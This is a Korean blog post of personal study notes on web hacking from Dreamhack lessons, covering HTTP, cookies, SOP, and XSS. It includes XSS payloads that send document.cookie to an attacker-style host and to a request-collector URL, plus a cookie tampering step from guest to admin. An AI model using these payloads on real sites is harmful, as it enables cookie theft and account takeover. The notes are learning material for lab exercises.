---
layout: post
title:  "Web Hacking Study - Dreamhack"
toc: true
---

## Introduction
그냥 소개하는 곳이구나.
각오: 부지런하자

## Background: Web
World Wide Web, W3, Web, 웹
웹: HTTP를 이용하여 정보를 공유하는 서비스
HTTP: 웹상에서 서로 통신을 하기 위해 정해둔 일종의 규칙
프론트엔드(Front-end): 이용자의 요청을 받는 부분
백엔드(Back-end): 요청을 처리하는 부분

웹 리소스: 웹에 갖춰진 정보 자산 - 고유의 Uniform Resource Identifier(URL)을 가짐
- Hyper Text markup Language (HTML): 태그와 속성을 통한 구조화된 문서 작성 지원
- Cascading Style Sheets (CSS): 웹 리소스들의 시각화 방법을 기재한 스타일 시트
- JavaScript (JS): 웹 문서의 동작 정의. (Client-Side Script)

## Background: HTTP/HTTPS

클라이언트의 행의 요청: Request / 서버의 행위 응답: Response
프로토콜(Protocol): 규격화된 상호작용에 적용되는 약속

HTTP: 서버와 클라이언트의 데이터 교환을 요쳥과 응답 형식으로 정의한 프로토콜
### HTTP 헤더
각 줄은 CRLF로 구분되며 첫 줄은 시작 줄(Start Line), 나머지 줄은 헤더(Header)라고 부름
헤더의 끝은 빈 줄
### HTTP 바디
헤드의 끝을 나타내는 CRLF 뒤 모든 줄

### HTTP 요청
시작 줄: 메소드, 요청 대상, HTTP 버전으로 구성
- 메소드: 요청 대상에 대해 서버가 수행하길 바라는 동작
예) GET(리소스 가져와), POST(요청 대상에게 데이터 보내)
### HTTP 응답
시작줄: HTTP 버전, 상태 코드, 처리 사유로 구성. 띄어쓰기로 구분
- 상태 코드: 요청에 대한 처리 결과를 세 자릿수로 나타냄 (예: 404)

HTTPS(HTTP over Secure socket layer): TLS를 사용하여 HTTP를 보완한 프로토콜

## Background: Web Browser

웹 브라우저: 뛰어난 이용자 경험을 제공하는 소프트웨어 중 하나
URL은 Scheme, Authority (Userinfo, Host, Port), Path, Query, Fragment로 구성
- scheme: 웹 서버와 어떤 프로토콜로 통신할지
- Host: Authority의 일부. 접속할 웹 서버의 주소에 대한 정보
- Port: Authority의 일부. 접속할 웹 서버의 포트에 대한 정보
- Path: 접근할 웹 서버의 결로로 '/'로 구분
- Query: 웹 서버에 전달하는 파라미터. ? 뒤에 위치
- Fragment: 메인 리소스에 존재하는 서브 리소스를 접근할 때 식별하기 위한 정보. # 뒤에 위치

Domain name: 도메인의 특성을 담은 이름을 정의하여 IP 대신 사용 (예: naver.com)

웹 렌더링(Web rendering): 서버로부터 받은 리소스를 이용자에게 시각화하는 행위

## Tools: browser DevTools
개발자 도구: F12 누르면 나오는 창
요소 검사: 웹 페이지의 원하는 요소에 마우스를 올리면 대상의 정보 출력, 클릭하면 관련된 HTML 코드 하이라이팅
디바이스 툴바: 현재 브라우저의 화면 비율 및 User-Agent를 원하는 값으로 변경 가능
Elements: HTML 코드 읽기
- 코드를 선택한 상태로 단축키 F2를 누르거나 더블클릭하면 수정 가능.
Console: 프론트렌드의 자바스크립트 코드에서 발생한 각종 메세지를 출력, 이용자가 입력한 자바스크립트 코드를 실행해주는 도구
- 윈도우즈 단축키 : Ctrl + Shift + J
Sources: 현재 페이지를 구성하는 웹 리소스 확인 가능, 원하는 JS 디버깅 가능
Network: 서버와 오가는 데이터 확인 가능. 로그를 우클릭하고 Copy로 복사 가능
Application: 쿠키, 캐시, 이미지, 폰트, 스타일시트 등 웹 애플리케이션과 관련된 리소스 조회

## ServerSide: Command Injection
인젝션(Injection): 악의적인 데이터를 프로그램에 입력하여 이를 시스템 명령어, 코드, 데이터베이스 쿼리 등으로 실행되게 하는 기법
Command Injection: 이용자의 입력을 시스템 명령어로 실행하게 하는 취약점
-> 이용자의 입력을 제대로 검사하지 않으면 임의 명령어가 실행될 수 있음

'' 명령어 치환 - 중복 사용 불가
$() 명령어 치환 - 중복 사용 가능
&& 명령어 연속 실행 - 앞 명령어 에러 발생 X 시 뒷 명령어 실행
|| 명령어 연속 실행 - 앞 명령어 에러 발생 시 뒷 명령어 실행
; 명령어 구분
| 파이프 - 앞 명령어의 결과가 뒷 명령어의 입력으로 들어감

## Background: Cookie & Session
HTTP 프로토콜 특징
- Connectionless: 하나의 요청에 하나의 응답을 한 후 연결 종료
- Stateless: 통신이 끝난 후 상태 정보를 저장하지 않는 것
이러한 특성을 갖는 HTTP에서 상태를 유지하기 위해 쿠키 탄생

쿠키: Key와 Value로 이뤄진 일종의 단위
개개인에게 맞춤형 서비스를 제공하기 위해 클라이언트를 식별할 수 있는 값을 쿠키에 저장해 사용함
-> 서버가 검증 없이 쿠키를 통해 이용자의 인증 정보를 식별하면 악의적인 클라이언트가 쿠키 정보를 변조한 공격에 당할 수 있음

세션(Session): 인증 정보를 서버에 저장하고 해당 데이터에 접근할 수 있는 키(유추할 수 없는 랜덤한 문자열, Session ID)을 만들어 클라이언트에 전달

## Exercise: Cookie
엔드포인트: /
서버는 별다른 검증 없이 이용자 요청에 포함된 쿠키를 신뢰하고, 이용자 인증 정보를 식별하기 때문에 공격자는 쿠키에 타 계정 정보를 삽입해 계정을 탈취할 수 있습니다.

<!--
C:\Users\skanj>python -c "import flask; print('Flask is installed')"
Flask is installed

C:\Users\skanj>import flask
'import'은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는
배치 파일이 아닙니다.

C:\Users\skanj>python -c import flask
  File "<string>", line 1
    import
          ^
SyntaxError: invalid syntax

C:\Users\skanj>python -c "import falsk"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ModuleNotFoundError: No module named 'falsk'

C:\Users\skanj>python -c "import flask"

C:\Users\skanj>python app.py
python: can't open file 'C:\\Users\\skanj\\app.py': [Errno 2] No such file or directory

C:\Users\skanj>cd /mnt/c/Users/skanj/OneDrive/바탕\ 화면/coding
지정된 경로를 찾을 수 없습니다.

C:\Users\skanj>cd C:\Users\skanj\OneDrive\바탕 화면\coding

C:\Users\skanj\OneDrive\바탕 화면\coding>python -c "import flask"

C:\Users\skanj\OneDrive\바탕 화면\coding>pyton app.py
'pyton'은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는
배치 파일이 아닙니다.

C:\Users\skanj\OneDrive\바탕 화면\coding>python app.py
 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.0.5:8000
Press CTRL+C to quit
-->

도대체 저 서버에 어떻게 들어가나 싶었는데 문제에 'VM 접속하기'를 누르면 들어갈 수 있는 서버가 떴다. 진짜 충격!!!

개발자 도구 -> 응용 프로그램 -> 쿠키 -> guest를 admin으로 변조

## Background: Cookie & Session
링크/admin 페이지에서 admin용 코드 복사해서 guest의 코드를 admin 코드로 붙여넣기

## mitigation: Same Origin Policy
SOP(Same Origin Policy), 동일 출처 정책: 가져온 데이터를 악의적인 페이지에서 읽을 수 없도록 하는 브라우저의 보안 매커니즘
이미지나 자바스크립트, CSS 등의 리소스는 SOP에 구애 받지 않고 외부 출처에 대해 접근을 허용한다

Origin(오리진): 브라우저가 가져온 정보의 출처
프로토콜(Protocol, Schema), 포트(Port), 호스트(Host)로 구성 -> 구성 요소가 모두 일치해야 동일한 오리진
동일한 오리진(Same Origin)-구성 요소가 모두 일치 / 다른 오리진(Cross Origin)-하나라도 다름

외부 출처에서 불러온 데이터를 읽으려고 할 때는 오류가 발생해 읽지 못함. 하지만 읽는 것 외에 데이터를 쓰는 것은 문제 없이 동작함.

교차 출처 리소스 공유(Cross Origin Resource Sharing, CORS): HTTP 헤더에 기반하여 Cross Origin 간에 리소스를 공유하는 방법
- 발신측에서 CORS 헤더를 설정해 요청하면, 수신측에서 헤더를 구분해 정해진 규칙에 맞게 데이터를 가져갈 수 있도록 설정

JSON with Padding (JSONP)
JSONP 방식은 <script> 태그로 Cross Origin의 데이터를 불러옴. 하지만 <script> 태그 내에서는 데이터를 자바스크립트의 코드로 인식하기 때문에 Callback 함수를 활용
예시: myCallback({'id':'dreamhack'});

## ClientSide: XSS
클라이언트 사이드 취약점: 웹 페이지의 이용자를 대상으로 공격할 수 있는 취약점
대표적인 공격: Cross Site Scripting(XSS) -  공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행할 수 있음
이용자가 삽입한 내용을 출력하는 기능에서 발생

발생 형태에 따른 XSS 종류
- Stored XSS: XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
- Refleced XSS: XSS에 사용되는 악성 스크립트가 URL에 삽입디고 서버의 응답에 담겨오는 XSS
- DOM-based XSS: XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
- Universal XSS: 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점. SOP 정책을 우회하는 XSS

### 콘솔에 넣을 수 있는 자바 스크립트 코드들
alert("hello");
alert(document.cookie); // 현재 페이지의 쿠키를 인자로 가진 alert 실행.
document.cookie = "name=test;"; // 쿠키 생성(key: name, value: test)
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie; // new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정
document; // 이용자의 페이지 정보에 접근.
document.write("Hacked By DreamHack !"); // 이용자의 페이지에 데이터를 삽입.
location.href = "http://hacker.dreamhack.io/phishing"; // 이용자의 위치를 변경.
window.open("http://hacker.dreamhack.io/") // 새 창 열기

## Exercise: XSS
취약점: vuln은 이용자가 입력한 값을 페이지에 그대로 출력하기 때문에 XSS가 발생

<!--
flag 엔드포인트에서 다음과 같은 익스플로잇 코드를 입력하면, memo 엔드포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있습니다.
<script>location.href = "/memo?memo=" + document.cookie;</script>
<script>location.href = "https://augpkgf.request.dreamhack.games/?memo=" + document.cookie;</script>
-->

## Exercise: XSS-2
셀레늄(Selenium): 웹 애플리케이션 테스팅에 사용되는 파이썬 패키지로, API를 통해 크롬, 사파리 등의 웹 드라이버를 사용할 수 있습니다
get으로 사용자가 입력한 param을 바로 return 하는 형태가 아니라, render_template 함수를 사용하고 있다 -> 이용자가 입력한 값을 페이지에 그대로 출력하지 않는다
var content = document.getElementById('example').innerHTML; // 읽기: 요소의 내부 HTML을 가져옴
document.getElementById('example').innerHTML = 'New Content'; // 쓰기: 요소의 내부 HTML을 변경
취약점: 이용자 입력을 바탕으로 innerHTML을 설정했을 때 XSS 공격에 취약할 수 있음

<!--
/flag 페이지의 param 부분에 입력하면, memo에서 임의 이용자의 쿠키 정보를 확인할 수 있게 됩니다.
<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">
-->

## 드림핵 아닌 BurpSuite
기능
- Proxy: HTTP, HTTPS 트래픽을 가로채고 조작할 수 있음. 요청 및 응답값 분석과 파라미터값 위/변조 가능
- 스캐너: 자동으로 웹 애플리케이션에서 보안취약점을 탐지하는 기능
- Repeater: 특정 응답값을 보내어 서버의 응답을 확인할 수 있음
- Intruder: 특정 응답값을 보내어, position, payload를 설정하여 무작위 대입을 할 수 있음
- Interceptor: 프록시에서 트래픽을 중단하고 사용자가 요청 및 응답을 수정한 후 전송 가능





